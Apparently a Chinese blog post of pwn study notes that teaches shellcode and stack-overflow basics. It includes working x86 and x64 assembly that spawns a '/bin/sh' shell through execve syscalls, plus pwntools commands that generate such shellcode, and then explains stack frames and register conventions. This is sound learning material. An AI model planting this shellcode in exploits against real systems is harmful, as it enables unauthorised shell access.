---
layout: post
title: "Pwn学习笔记 (三)"
author: "1llysviel"
categories: journal
tags: [documentation]
image: ELF.jpg
---

# Pwn学习笔记 三

----

## shellcode

​	什么是shellcode？

​		shellcode通常是软件漏洞利用过程中使用一小段机械码来：

- 启动shell，进行交互
- 打开服务器端口等待反馈
- 反向连接服务器端口
- （等等

那么一个简单的shell程序怎么获得呢

```bash
vim shell.c
#include"stdlib.h"
#include"unistd.h"

void main( )
{
        system("/bin/sh");
        exit(0);
}

gcc -o shell shell.c

#那么这个shell是怎么运行的？
gdb shell
b main
Breakpoint 1 at 0x1169
r
0x555555555178 <main+15>              call   system@plt                <system@plt>
#可以看到这个程序调用system的时候是先call了system的t表，通过system的t表找到了system函数的具体位置，再调用的main
#但是在真实情况下，你是不知道system函数的具体位置的，所以你没法call system@plt
↑P1 ↓P2
ll
#会发现这个shellcode文件 很大，比赛的时候是限制字节数的

#那么怎么解决俩问题呢？
→
1、触发中断（int 0x80或者syscall）进行系统调用
2、system底层调用（“/bin/sh”）或者调用execve（“/bin/sh ,0,0”）

#x32 execve syscall
0x0b 	const char *filename
#x64 execve syscall
0x3b	const char *filename
"https://publicki.top/syscall.html"
#但不是利用shellcode设置好各个寄存器，最后int 0x80进行系统调用就能getshell吗

#x32
nasm -f elf32 i386.asm
ld -m elf_i386 -o i386 i386.o
objdump -d i386
global_start
_start:
	push "/sh"
	push "/bin"
	mov ebx,esp;;ebx="/bin/sh"
	xor edx,edx;;edx=0
	xor ecx,ecx;;ecx=0
	mov al,0xb;;设置al=0xb
	int 0x80
#x64
nasm -f elf64 x64.asm
ld -m elf_x86_64 -o x64 x64.o
objdump -d x64
global _start
_start:
	mov rbx,'/bin/sh'
	push rbx
	push rsp
	pop rdi
	xor esi,esi
	xor edx,edx
	push 0x3b
	pop rax
	syscall
	
#但是这手敲太麻烦了，可以使用pwntools
1.设置目标架构
2.生成shellcode
#x32
from pwn import*
context(log_level='debug'arch='i386',os='linux')
shellcode=asm(shellcraft.sh())
#x64
from pwn import*
context(log_level='debug',arch='amd64',os='linux')
shellcode=asm(shellcraft.sh())

程序逻辑
1、向buf读取0x400字节内容
2、并调用执行读入的内容
```

## 栈溢出基础

​	函数调用栈：程序运行时内存一段连续的区域，用来保存函数运行时的一些状态信息（包含局部变量与函数参数等）


称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存再栈内，被调用函数（callee）的状态被压入调用栈的栈顶

在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶回复到调用函数的状态

函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大



其中函数状态主要涉及三个寄存器 ----esp，ebp，eip

​	esp：用来储存函数调用栈的栈顶地址，在压栈和退栈时发生变化。

***ESP(Stack Pointer)是堆栈指针寄存器，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶***

​	ebp用来储存当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。

***EBP(Base Pointer)是栈帧基址指针寄存器，存放执行函数对应栈帧的栈底地址，用于C运行库访问栈中的局部变量和参数。***

​	eip用来储存即将执行的程序指令的地址，cpu依照eip的储存内容读取指令并执行，eip随之只想相邻的下一条指令，如此反复，程序就得以连续执行指令

***EIP(Instruction Pointer)指令寄存器，指向处理器下条等待执行的指令地址(代码段内的偏移量)，每次执行完相应汇编指令EIP值就会增加（它其实一直在改变）***

下面是函数调用时，栈顶函数状态以及上述寄存器的变化：

​	“首先将被调用函数的参数按照逆序依次压入栈内，如果被调用函数不需要参数，则没有这一步骤，这些参数仍会保存在调用函数的函数状态内，之后压入栈内的数据都会作为被调用函数的函数状态保存”

​	“然后将调用函数进行调用后的下一条指令地址作为返回地址压入栈内，这样调用函数的eip信息得以保存”

​	“再将当前的ebp寄存器值（也就是调用函数的基地址）压入栈内，并将ebp寄存器的值更新为当前栈顶的地址。这样调用函数的ebp（基地址）信息得以保存。同时ebp被更新为被调用函数的基地址”

​	“再之后是将被调用函数的局部变量等数据压入栈内”

总结：函数调用变化的核心就是

-------

### new

#### 1、寄存器分配

​		 寄存器是处理器加工数据或运行程序的重要载体，用于存放程序执行中用到的数据和指令。因此函数调用栈的实现与处理器寄存器组密切相关。

主要涉及三个寄存器 ----esp，ebp，eip

​	esp：用来储存函数调用栈的栈顶地址，在压栈和退栈时发生变化。

***ESP(Stack Pointer)是堆栈指针寄存器，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶***

​	ebp用来储存当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。

***EBP(Base Pointer)是栈帧基址指针寄存器，存放执行函数对应栈帧的栈底地址，用于C运行库访问栈中的局部变量和参数。***

​	eip用来储存即将执行的程序指令的地址，cpu依照eip的储存内容读取指令并执行，eip随之只想相邻的下一条指令，如此反复，程序就得以连续执行指令

***EIP(Instruction Pointer)指令寄存器，指向处理器下条等待执行的指令地址(代码段内的偏移量)，每次执行完相应汇编指令EIP值就会增加（它其实一直在改变）***

【扩展阅读】**栈帧指针寄存器**

为了访问函数局部变量，必须能定位每个变量。**局部变量相对于堆栈指针ESP的位置在进入函数时就已确定**，理论上变量可用ESP加偏移量来引用，但ESP会在函数执行期随变量的压栈和出栈而变动。尽管某些情况下编译器能跟踪栈中的变量操作以修正偏移量，但要引入可观的管理开销。而且在有些机器上(如Intel处理器)，用ESP加偏移量来访问一个变量需要多条指令才能实现。

因此，许多编译器使用帧指针寄存器FP(Frame Pointer)记录栈帧基地址。局部变量和函数参数都可通过帧指针引用，因为它们到FP的距离不会受到压栈和出栈操作的影响。有些资料将帧指针称作局部基指针(LB-local base pointer)。

在Intel CPU中，寄存器BP(EBP)用作帧指针。在Motorola CPU中，除A7(堆栈指针SP)外的任何地址寄存器都可用作FP。当堆栈向下(低地址)增长时，以FP地址为基准，函数参数的偏移量是正值，而局部变量的偏移量是负值。

#### 2、寄存器使用约定

​		 程序寄存器组是**唯一能被所有函数共享的资源**。虽然某一时刻只有一个函数在执行，但需保证当某个函数调用其他函数时，被调函数不会修改或覆盖主调函数稍后会使用到的寄存器值。因此，IA32采用一套统一的寄存器使用约定，所有函数(包括库函数)调用都必须遵守该约定。

​		**寄存器%eax、%edx和%ecx为主调函数保存寄存器(caller-saved registers)，当函数调用时，若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中；被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据**

​		**寄存器%ebx、%esi和%edi为被调函数保存寄存器(callee-saved registers)，即被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器%ebp和%esp，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。**